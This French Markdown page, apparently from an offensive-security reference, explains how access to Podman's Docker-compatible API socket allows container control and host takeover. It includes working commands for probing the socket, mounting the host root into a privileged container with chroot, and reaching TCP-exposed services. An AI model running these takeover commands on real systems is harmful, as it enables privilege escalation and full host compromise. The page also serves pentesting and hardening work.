---
title: "Socket de service API : contrôle des conteneurs via l'endpoint compatible Docker de Podman"
description: "Podman peut exécuter un service exposant une API REST compatible Docker sur un socket Unix, ou en TCP. Un processus capable d'atteindre ce socket pilote Podman pour créer et exécuter des conteneurs, et là où Podman s'exécute en root ou que le socket est exposé sur le réseau, cela offre le même chemin de prise de contrôle de l'hôte que l'API du démon Docker."
keywords:
  - socket podman
  - podman system service
  - api compatible docker
  - contrôle de conteneur
  - prise de contrôle de l'hôte
---

# Socket de service API

Bien que Podman soit sans démon par défaut, il peut exécuter `podman system service`, qui expose une API REST compatible avec l'API Docker Engine. L'endpoint est un socket Unix (utilisateur ou root), et il peut être lié en TCP. Atteindre ce socket, c'est contrôler les conteneurs : l'appelant crée et démarre des conteneurs via l'API familière de forme Docker. L'impact dépend de qui exécute le service. Un service Podman root, ou exposé en TCP, est un chemin de prise de contrôle de l'hôte identique au démon Docker ; un service rootless est borné par le [modèle rootless](rootless-model.md).

Trouvez et sondez le socket :

```bash
ls -l /run/podman/podman.sock /run/user/$(id -u)/podman/podman.sock 2>/dev/null
curl -s --unix-socket /run/podman/podman.sock http://d/v4.0.0/libpod/info | head
# Docker-compatible path works too:
curl -s --unix-socket /run/podman/podman.sock http://d/version
```

## Contrôle des conteneurs et prise de contrôle

```bash
# point the docker CLI at the Podman socket (Docker-compatible API)
export DOCKER_HOST=unix:///run/podman/podman.sock
docker ps -a; docker images
# if the service runs as root, mount the host and take over
docker run -v /:/host --privileged --rm -it alpine chroot /host sh
# Podman-native client against a remote/tcp service:
podman --url tcp://<target>:<port> run -v /:/host --privileged alpine chroot /host sh
```

Via l'API brute, créez un conteneur avec un `HostConfig.Binds` de `/:/host` et `Privileged:true`, exactement comme pour le socket Docker.

## Notes d'exploitation

- Le facteur décisif est le privilège du service : `info`/`version` indique s'il est rootful ; un socket rootful ou exposé en TCP est une prise de contrôle complète de l'hôte, un socket rootless est limité à l'utilisateur appelant.
- Un service Podman lié en TCP sans TLS est l'équivalent Podman d'un Docker 2375 ouvert ; recherchez-le et connectez-vous avec `--url`.
- Le socket n'est protégé que par les permissions du système de fichiers (ou rien, en TCP) ; `ls -l` dessus détermine l'accessibilité. Les mécanismes en aval correspondent à [Prise de contrôle de l'hôte via un run privilégié](../docker/exposed-daemon-api/host-takeover-via-privileged-run.md).

## Références

- [Podman: system service and REST API](https://docs.podman.io/en/latest/markdown/podman-system-service.1.html)
- [Podman API reference](https://docs.podman.io/en/latest/_static/api.html)
